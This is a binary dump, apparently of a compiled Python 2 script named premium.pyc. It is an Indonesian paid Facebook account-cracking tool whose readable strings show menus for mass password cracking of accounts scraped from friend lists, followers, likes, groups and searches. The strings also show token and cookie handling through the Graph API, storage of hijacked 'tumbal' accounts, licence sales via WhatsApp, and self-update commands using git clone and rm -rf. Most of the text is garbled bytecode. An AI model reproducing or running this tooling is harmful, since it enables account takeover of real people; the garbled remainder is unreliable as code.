+s User-Agent Tunggal(1) shp.txts User-Agent Settingan s ...........s  Proses Crack Sedang Berjalan.. t!s& Tekan Tombol CTRL+Z untuk Berhenti..!s! Jika Tidak Muncul hasil Crack.. s Hidupkan-Matikan Mode Pesawat!RD(RR RRR"R!R#RnR&R(tua_R1R%R�R'R�R�R�R�R�R�R�R�RR�R9(R�R.thp((s
+premium.pyR�s�)IIA)9)
+
+@1
+)@1
+
+)  !!!!
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+c
+s:tGHtdGHytdd�j�}Wntk
+rCtdGHn�Xy�g��fd�}tdd��,}tdd�j�}|j||�WdQXt}x�|rEyytGHt  t
+dtd  t
+d
+tdtd�}x=t
+d
+t��d
+�D]"}t|�|kr�t}Pq�q�WWq�tk
+r;t�q�q�Xq�Wd
+}xF�D]>}|t|�kr��j|�}�|}  n|d
+7}qSWtjdj|  jd���j�d}
+t
+dtdt|
+GH|  jdd�}tdd�}|j|�|j�t�Wntk
+r5tdGHnXdS(Ns
+     Pilih Akun Buat Tumbal!
+sakun_tumbal.txtRs
+ Belum Ada Hasil Tumbal...cs{g}d}tj��]ax
+|D]}y�tjdj|jd���j�d}tjdj|jd���j�}x9|dD]-}y|j|d|d�Wq�q�Xq�Wtdt  t
+|�td  t|td
+t  t
+t
+|��GHg}|d7}�j|�Wq"q"Xq"Wtdd�j�x3�D]+}tdd
+��}|j|�WdQXqBWWdQXdS(Nis-https://graph.facebook.com/me?access_token={}s
+R>s@https://graph.facebook.com/me/friends?limit=5000&access_token={}RZR\s [s] s
+ > Teman: sakun_tumbal.txtRR"(R_R`R�RoRaR�RpR(R RRJRR"R%R#tcloseR$(Rvtjml_temRttok_devR�RZRPtmasuk(ttoken_(s
+premium.pytlist_�s,
++'C
+
+Ris [R�s] tPilihs: is-https://graph.facebook.com/me?access_token={}s
+R>s
+ >_<s Sukses Ganti Tumbal: RDs  token.txtRs
+ :( Token Kedaluarsa..(RR R#RGRLRKRR�R�R!R"RRR�R%R�R�R�R)RJR�R�RoRaR�RpRIR$RRCR�(
+RvRR  t  iqbal_toktkonR+RPRttokenzttokenkuR�tiqbalzttok_((Rs
+premium.pytcek_akun_tumbal�sR  
+    0 
+
+
+
++
+
+
+cCs�ytdd�j�aWntk
+r3t�n�Xy9tj��'}|jdjt��j  �dWdQXWnLt
+k
+r�tdGHt�t�n%tj
+jk
+r�ttd�nXdS(Ns  token.txtRs-https://graph.facebook.com/me?access_token={}R>s
+ Token Kedaluarsa...s
+ Gangguan Koneksi Internet!(R#RnRvRLR�R_R`RoRaRpR�RKRBR�R�R)R(R�((s
+premium.pyR�!  s
+*
+  
+cCs7y)tdd��}|jd�WdQXWnnXdS(Nsl.txtR"t.(R#R$(R�((s
+premium.pyt_yu_2  s
+cCsy�tdd�j�djd�}tdd�j�djd�}tdd�j�djd�}tdd�j�djd�}i|d6|d  6|d
+6|d6aWnhy#td�j�}i|d6aWqtt�dkr
+td
+tdGHt  �qt
+�qXnXdS(Ns
+cookie.txtRis
+iiiR�R�R�R�R�s
+ >>>s Harus Login Cookie Dulu!...
+(R#RGR�R�RnR%t  cek_cokieRRR�R�(R�R�R�R�tcok((s
+premium.pyt
+cek_cookie9  s$""""
+
+cCs�dtdtdtdtdtdtdtdtd  td
+tdtdtd
+tdtdtdtdtdtdtdGHtdtdttGHtdtdtdGHdS(Nt
+s________              s.___________   
+s\__  __ \   _______  _s|   \__  __ \  
+s |   \|  \_/ __ \  \/ /s   ||   \|  \ 
+s |    `   \  ___/\   /s|   ||    `   \
+s/_______  /\___  >\_/ s|___/_________/ s  
+ PREMIUMs {tMBFR;s \/ {tAuthors: Rs} s >>>s IP: s Versi: s2.2(R"RRR R�(((s
+premium.pytbannerO  s�c  Cs$y>tdd�j�}|jdd�}|jd�d}Wntk
+rQnXyItdd�j�}|jdd  �jd
+d�}d|d
+d}Wntk
+r�nXyVtjd�t�tGHt  dGHtGHt
+dt  dt
+dt  dt
+dGHt
+dt  dt
+dt  dt
+dGHt
+dt  dt
+dt  dt
+dGHt
+dt  dt
+dt  dt
+dGHt
+dt  d  t
+dtdGHy�||krCt
+dt  dt
+dtdt  dt
+d t  d!td"t  d#tdGHt
+dt  dt
+dtd$GHt
+dt  d%t
+dtd&GHn3td't
+d(GHtd)t
+d$GHtd*t
+d&GHWn:td+t
+d(GHtd)t
+d$GHtd*t
+d&GHnXt
+dt  d,t
+dtd-t  d.GHt
+dt  d/t
+dtd0t  d.GHtGHtt
+dtd1t
+dt  d2�}|dksW|d3ksW|d4krat�n|dkrwt�n|dkr�t�n|dkr�t�n|dkr�y!tjd5d6d7g�t�Wq�t�q�Xn|d  kr<d8}y!tjd5d6|g�t�Wq<t  d9t
+|GHt�q<Xntd:t
+d;t  d<}y�||kr�|dkr�tGHt�t�t�dGHtGHtd=�n|dkr�t�t�n|d%kr
+t�q
+n5td>td?td@tdAtdBGH|GHt�WnFtk
+rVtd>td?tdCtdAtdBGH|GHt�nX|d,kr�y]tj dD�tj dE�tj dF�tj dG�t
+dHt  dIGHt!j"dJ�t#�Wq�t$k
+r�tdKGHt#�q�Xn|d/kr�t�nt�Wnt$k
+rt�nXdS(LNs  cokie.txtRR�RDsA+ZZis
+cokiez.txtR
+RR�RR�R�R�Rs"       L O G I N   F A C E B O O Ks [Rs Login Dengan FBs TOKENRs CookieR
+s Username & PasswordRs Ikuti Instagrams   IqbalDevs Cara ambil Cookie FBRs Crack Dari PencarianR�sNo loginR�R<sPremium!s Cek Hasil Crack CheckpointRs Ganti Tumbal Hasil Crack Lives [5]s) Crack Dari Pencarian(No login)[Premium!]s [7]s [8]s [6]t9s Update Tools...t10s ExitR�s
+ Pilih Opsi? REs  R2R3s#https://www.instagram.com/iqbaldev/s8https://www.youtube.com/channel/UC6jKXb_0qEoXqKTVDG5JphAs
+ Link Vidio Youtube: s 
+ [>.] Silahkan Hubungi Admin! 
+s     No Whatsapp Admin =>s 08812457948s
+ Done....
+s
+ [s>.s] Belum Premium...
+ [s>!s] Harus Premium Dulu.!s] Belum Premium.... 
+ [s4git clone https://github.com/IqbalDev/dev_id_premiumsrm -rf premium.pycs#cp -f dev_id_premium/premium.pyc \.srm -rf dev_id_premiums
+ Sukses Update Tool..s>_<
+is
+ Perangkat Anda Tidak Suport!
+(%R#RnRIRRLR�R(R0RRR RR"R�RKR!R9R�R�R�R4R5R�R8RRR)R�RR't  NameErrorR<R=R�RRCR�(  t
+user_agentzz_tuser_agentzztuser_agent_tcokiez_tcokiez1tcokiezR�turl_ytbtadmin((s
+premium.pyR�Y  s�
+
+
+  ))))!Q!$))($
+
+
+
+
+
+
+)
+)
+
+
+
+
+
+  
+
+cCsO|jdd�jdd�}tdd��}|jd|d�WdQXdS(  NR
+RR�Rs  cokie.txtRR�R�(RIR#R$(R&tdevivtcok_dev((s
+premium.pyt__yuk_yuk__�  scCs)tdd��}|j|�WdQXdS(Ns
+cokiez.txtR(R#R$(R&Rw((s
+premium.pyt__yuk__�  sc1CsCyddl}t�tj���}|jdj|��j�}tGHtdt  dtdt
+dGtdt
+|dtd  GHtdt  dtdt
+d
+tG|dGHy�t
+tkr)tdt  dtdt
+dtd
+GHtjj�}|j}|j}|j}tdd�j�}|jdd�}  d|  kr�tdd��b}
+t|�dt|d�dt|�}tj|�}tj|�}|
+jd|�WdQXntdd�j�}|jdd�}  y|  jd�d}
+Wn|  j�}
+nXtj|
+�}tj|�}|j�}tt |d�t |d�t |d��}t|||�}||}t|�j�d}dt!kr�tdt  dtdt
+dtdGHqRdt|�ks�dt|�kr�ddl}t"dGHt"dGHt
+dt
+dGHy&|j#|j$d krFd!nd"�WnnXy&|j#|j$d krvd#nd$�WnnXtd%d&��}|jd'�WdQXt%�nt |�d(kr�tdt  dtdt
+dtd)GHqRtdt  dtdt
+dt|t
+d*GHn)tdt  dtdt
+dt"d+GHWn:t&k
+r�tdt  dtdt
+dt"d+GHnXtGHy�t
+tkrtdt  d,tdt
+d-t  d.GHtdt  d/tdt
+d0t  d1GHtdt  d2tdt
+d3GHtdt  d4tdt
+d5GHtdt  d6tdt
+d7GHtdt  d8tdt  d7t
+d9td:t
+d;GHtdt  d<tdt
+d=td>GHtdt  d?tdt
+d@t  dAGHtdt  dBtdt
+dCtdDt
+dEt  dFGHtdt  dGtdt
+dHGHtdt  dItdt
+dJGHtdt  dKtdtdLGHtdt  dMtdt
+dNGHtdt  dOtdtdPGHtdt  dQtdt  dRGHtdt  dStdt
+dTtGHn<tdt  d,tdtd-t  d.GHtdt  d/tdtdUGHtdt  d2tdtd3GHtdt  d4tdtd5GHtdt  d6tdtd7GHtdt  d8tdtd7t  dVGHtdt  d<tdtdWGHtdt  d?tdtdXGHtdt  dBtdt
+dCtdDt
+dEt  dFGHtdt  dGtdt
+dHGHtdt  dItdt
+dJGHtdt  dKtdtdLGHtdt  dMtdt
+dNGHtdt  dOtdtdPGHtdt  dQtdtdRGHtdt  dStdt
+dTtGHWnCtdt  d,tdtd-t  d.GHtdt  d/tdtdUGHtdt  d2tdtd3GHtdt  d4tdtd5GHtdt  d6tdtd7GHtdt  d8tdtd7tdVGHtdt  d<tdtdWGHtdt  d?tdtdXGHtdt  dBtdt
+dCtdDt
+dEt  dFGHtdt  dGtdt
+dHGHtdt  dItdt
+dJGHtdt  dKtdtdLGHtdt  dMtdt
+dNGHtdt  dOtdtdPGHtdt  dQtdtdRGHtdt  dStdt
+dTtGHnXy<t
+tkr�n)tdt  dYtdt
+dZtd[GHWn:t&k
+rtdt  dYtdt
+dZtd[GHnXtGHt't
+d\td�}td]t
+d^t  d_td`t
+}yRt
+tkr|d,kr�t(t)kr�t*j+da�db}t,||�t-�t.�dcGtGt
+ddGHq�|d/kr7
+t(t)kr7
+t*j+da�t'tdet
+dtdt
+dft  dg�}t,||�t-�t.�dcGtGt
+ddGHq�|d2kr�
+t(t)kr�
+t*j+da�t'tdet
+dtdt
+dht  dg�}t/||�t-�t.�dcGtGt
+ddGHq�|d4kr2t(t)kr2t'tdet
+dtdt
+dit  dg�}t0||�t-�t.�dcGtGt
+ddGHq�|d6krt(t)krt1j+da�t2�t*j+da�t'tdet
+djtdt
+dktdg�}t3tdt
+djtdt
+dlt  dg�}dmj|�}t4||t5�dGHt-�t.�dcGtGt
+ddGHt%�q�|d8krat(t)kratGHt6�t-�t.�dGHtGHt%dn�q�|d<kr�t(t)kr�t*j+da�t1j+da�t2�t7j+d�t'tdet
+djtdt
+dot  dg�}d}dmj|�}t4||t5�q�|d?kr�t(t)kr�t1j+da�t2�t*j+da�t8|�dGHxft9t:�D]X}t;j+|�tdpt
+dtdt
+dqtdgtt<t;��Gt=j>j?�qTWt-�dGHt.�dcGtGt
+ddGHt%�q�|dQkr�t(t)kr�t@�q�n�y�|d,ksr|d/ksr|d2ksr|d4ksr|d6ksr|d8ksr|d<ksr|d?ksr|dQkr�t
+tkr�q�dY}nWn
+dY}nXWn�y�|d,ks|d/ks|d2ks|d4ks|d6ks|d8ks|d<ks|d?ks|dQkr)t
+tkr q)dY}nWq>dY}q>XnX|dBkrTtA�n|dGkr�t'tdet
+dtdt
+drt  dst
+dg�}|dtks�|dukr�t  dvGHtB�t%�q�|dwks�|dxkr�tC|�q�tD�n|dIkr�ddl}y]|j#dy�|j#dz�|j#d{�|j#d|�td}t
+d~GHtEjFd�tG�Wq�tHk
+r�t"dGHtG�q�Xn|dKkr�tI�n|dMkr�tJ�n|dOkr�tK�tL�n|dSkr�tD�nyt
+tkrntM}Wn�t&k
+r�|dYkr�tGH|GHd�}d�td�t
+d�t  d�td�td�t  d�td�t  d�t
+d�t  d�t
+d�t  d�t
+d�GHt'td�td��ttNjOd�d���} t"d�}!y4td�d�j�}"|"t| �kr|"} nWntPk
+r%nXytd�d�j�}Wn%tPk
+rftQ| �tR| �nXy�t  d�t
+d�GHt  d�t
+d�ttj| �GHt
+d�GHtd�t
+d�t  |GHdGHyBtd%d�}#tSjTd�d�d�|d�tj| �d�g�Wn6tSjTd�d�d�|d�tj| �d�g�nXWnBtd]t
+d�ttj| �GHtd�t
+d�t|GHnXyHtR| �yt'tdet  d�tdt
+d�t  d��}$tj|$�}tj|�}%d�|%kr
+d�}&|%jd�d�}%nd}&Wn(tUk
+r;t"d�GHtV�t%�nXyp|%jd�d�}'|'tdd�j�kr�td�t
+d~GHtdd�j�}(tdd&��})|)j|(d��WdQXtjj�}|j}|j}|j}tdd���}
+ttW||��}*|*jd�d�jd;d�j�d}+ttXjX��jY�},tj|,�}-tj|-�}.d�|&kr�|d�}/t |/�t |+�kr4dKt|�kr�d}|d}t|�dt|�dtt |/�t |+��}0q`t|�dt|d�dtt |/�t |+��}0n,t|�dt|�dt|d��}0tj|0�}tj|�}|
+jd|d|.�nt|�dt|d�dt|�}0dKt|�krd}|d}t|�dt|�dt|�}0ntj|0�}tj|�}d�|%kr]|
+jd|dd|.�n|
+jd|d|.�WdQXtd]t
+d�t  d�GHt%�n|!GHtV�WntHk
+r�|!GHtV�nXWq�tHk
+r�tV�tD�q�Xq�nXtD�WdQXWn8tHk
+rtD�n!tZk
+r>t"d�GHt[�nXdS(�Ni����s-https://graph.facebook.com/me?access_token={}s [RRs Hai:R�R>R;s ID :R\s Status:s   Premium*s  cokie.txtRR�RDsA+ZZR"REiiis Waktu: t  Unlimitedt:R9s, [!] Anda Sudah Melebihi Batas Pemakaian :( s, [!] Silahkan Beli Lisensinya lagi Ke Admin!s [>] Ini No WA Admin:s
+ 628812457948Rs
+del cokie.txtsrm -rf cokie.txtsdel cokiez.txtsrm -rf cokiez.txtsco.txtRttaiitSebulans
+ Hari lagis PREMIUM LAH*R
+s Crack from friends lists + TTLRs Crack from Publics/Teman dari TemanR
+s Crack from Followers listRs Crack from LikesRs Crack from People SearchRs (tPROR�Rs Crack sfriends list from people searchRs Crack from My Groupss/MassalR1s Cek hasil Cracks OKR�tCPR2s Log Out Facebookt11s Update Toolt12s Setting User-Agentt13s! Buka Halaman Login Game Lewat FBt14s  Cek Sesi Hasil Crack Checkpointt15s Ganti Tumbal Hasil Crack Livet16s Exit..s# Crack from Public/Teman dari Temans PROs& Crack friends list from people searchs Crack from My Groups/Massalt17s Dapatkan Versis PREMIUMs >>> s
+ [!]se Upgrade ke versi Premium, dan beli Lisensinya
+     ke Admin! untuk mendapatkan Fitur yg Lengkap
+    s No Whatsapp Admin s=> 628812457948RPR^s
+sDone...s
+ [s Masukkan ID Profil Publics: s Masukkan ID Profil Targets Masukkan ID PostinganR�s Cari Orangs Masukkan Jumlahs/https://mbasic.facebook.com/search/people/?q={}s
+ Done....
+s$ Cari orang untk ambil list temannyas
+ [s Filter Data Duplikats Log Out dari Facebook?s[y/n]tyesRFs
+ Keluar Dari Facebook..
+tnoR�s4git clone https://github.com/IqbalDev/dev_id_premiumsrm -rf premium.pycs#cp -f dev_id_premium/premium.pyc \.srm -rf dev_id_premiums
+ Sukses Update Tool..s>_<
+s
+ Perangkat Anda Tidak Suport!
+t628812457948s
+  Cara mendapatkan Lisensi Tool ini, 
+  Kamu tinggal ikuti arahannya, 
+  pertama Chat admin dulu, serta 
+  mengirimkan Tool Key yg tertera pada 
+  pesan yg nanti kamu Kirimkan,
+  Lalu Kirim Bukti Pembayarannya,
+  Biar bisa langsung di Proses oleh admin,
+  >> Tekan Enter lanjut 
+  kes   Whatsapps Untuk Chat Admin
+
+ s
+ Bayar ->,s Via DANA/OVO
+ s No DANA >>s 08812457948
+ s No OVO >> s08812457948
+
+  slist harga:
+  ------------
+    t>s 1 Bulan 50k
+    s Permanen 150k
+s [!]s% Tekan Enter Untuk Lanjut Chat Admin!i�l��I�5s0
+ Lisensi Salah, Silahkan Beli Lisensi ke Admin!s
+cokiez.txts
+ ! s!Chat Admin Untuk Beli Lisensinya!s ! sBerikan Tool Key ini ke Admin: s   Untuk Didaftarkan....s   ==>s Ini No Wa Admin: R2R3shttps://wa.me/s?text=*MY%20Tool%20Key:%20sk*
+Assalamu'alaikum%20Bang,%20Mau%20Beli%20Lisensi%20Tool Facebook Lagi!, Saya udah Melebihi Batas PemakaiansD*
+Assalamu'alaikum%20Bang,%20Mau%20Beli%20Lisensi%20Tool%20Facebook!sM Silahkan Chat Admin Untuk Beli Lisensi!
+     !Jan lupa Kirim Tool Key ini=> s [*]s Ini No Whatsapp Admin: Rs Masukkan Lisensinya Disini s--> tMs
+ Salah Man....!tAs
+ Sukses... R�R�is) Jalankan lagi Toolsnya!
+ Ketik Perintah spython2 premium.pyc
+s7
+ [!] Token Kedaluarsa...
+     Silahkan Login Kembali! (\R<R0R_R`RoRaRpRR RRR"R�R6R9R=R>R@R?RAR#RnRIRJtbase64t  b64encodet  b32encodeR$Rt  b32decodet  b64decodeRR�R4RKR=R>R)R3R!tpillihR�tttl_R(RRRRR
+R*R,R�R!R�R8R�R,RHRRqR%RrRsRtR'RURBt__menu__R9R�RRCR�R1R8R�RtuhuR�R[RLR?R>R4R5t  TypeErrorR@RtplatformRYR�R�(1RvR<R�R�ttgltblntthnRAtdu_tduR0tdata64tdata32wtmasetdec32tmastmulaitselestsisatlim_devR�R�t
+beli_lisenRutid_postingantkeywordR"R#RPtsub_pilRZtno_tid__tlisen_salahtid_metduitRctdec64tiqbal_ztdetcokietgans_tgtjm_haritplatform_devtplattplat_devtday_ttgls((s
+premium.pyRZ�  s�=-)      ,0
+,$    &&
+,4-
+-))!!!9))9!!!!!!()!!!!)!!9!!!!!!))!!!!)!!9!!!!!!)-
+-&
+
+
+0
+
+0
+0
+
+
+00
+
+
+
+
+0
+
+
+
+8
+
+l
+l
+
+8  
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+m
+
+
+
+
+"  37"
+0
+
+        (
+
+;?,,
++ 
+
+
+
+
+
+  t__main__s  token.txt(�R�RKR RtbtjR"RR<tconcurrent.futurest
+concurrenttImportErrorR=R>tbs4RR_R�R�RrR�R4R=R]Rt  threadingRRtcalendarRtfolowR�turl_ipRuRqRXRDRR�RYRBR*RWRRoRptipmR�R�R�R)RR'R&R�R�R�R�R#RnR(RLR*R1R7R6R8R9R?R@RARBRCR1RURmRxR�R�R�R�R�R�R�R�R�RSRJRYR|RTR}RUR~R4RIR5RR6RXR�RFt
+IndexErrortc_R$R7R8R9R�R�R�R�RRRR
+RR�R!R)R,R*R8RJRLRZR\R�R�R�R�R�R�R�R�R�R�R�RR�R�R�R�R�R�R�R�RCRRRR'R�R)R,R0R�R>R?RZt__name__Rv(((s
+premium.pyt<module>
+s�
+  &
+  &
+  &`  
+    �            
+  
+  I      $  
+          I  $
+
+
+$
+
+
+
+    s  4      6    T  J      N  s  �    y  �
+  {  �    X  I        
+  p      ��T
